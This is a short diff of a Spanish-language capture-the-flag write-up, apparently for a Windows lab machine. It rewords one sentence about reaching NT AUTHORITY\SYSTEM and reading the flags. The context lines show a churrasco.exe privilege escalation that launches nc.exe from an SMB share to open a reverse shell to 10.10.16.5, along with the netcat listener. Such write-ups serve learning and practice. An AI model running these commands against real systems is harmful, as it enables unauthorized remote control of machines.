@@ -500,7 +500,7 @@ C:\Temp>churrasco.exe "\\10.10.16.5\smbFolder\nc.exe -e cmd 10.10.16.5 444"
 churrasco.exe "\\10.10.16.5\smbFolder\nc.exe -e cmd 10.10.16.5 444"
 ```
 
-Verificamos que hemos logrado la conexión y que somos el usuario `NT AUTHORITY\SYSTEM`. Verificamos que logramos visualizar las flags de **user.txt** y **root.txt**.
+Verificamos que hemos logrado la conexión y que somos el usuario `NT AUTHORITY\SYSTEM`. Por otro lado, comprobamos que logramos visualizar las flags de **user.txt** y **root.txt**.
 
 ```bash
 ❯ rlwrap -cAr nc -nlvp 444
